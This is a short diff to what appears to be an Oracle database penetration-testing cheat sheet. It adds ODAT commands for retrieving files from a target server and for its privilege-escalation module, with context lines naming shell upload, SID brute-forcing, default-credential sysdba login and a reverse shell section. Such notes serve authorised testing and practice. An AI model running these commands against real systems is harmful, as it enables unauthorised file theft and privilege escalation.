@@ -167,6 +167,12 @@ upload shell:
 
 ```
 
+#### Get files
+
+```text
+./odat.py utlfile -s <IP> -d <SID> -U <username> -P <password> --getFile "C:/test" token.txt token.txt
+```
+
 ### Metasploit
 
 #### sid bruteforce:
@@ -422,6 +428,12 @@ sqlplus SCOTT/tiger@10.10.10.82:1521/XE as sysdba
 **Remove the exploit using:** 
 
 `drop index exploit_1337;` 
+
+#### ODAT
+
+```text
+./odat.py privesc -s $SERVER -d $ID -U $USER -P $PASSWORD -h #Get module Help
+```
 
 ## reverse shell \#1
 
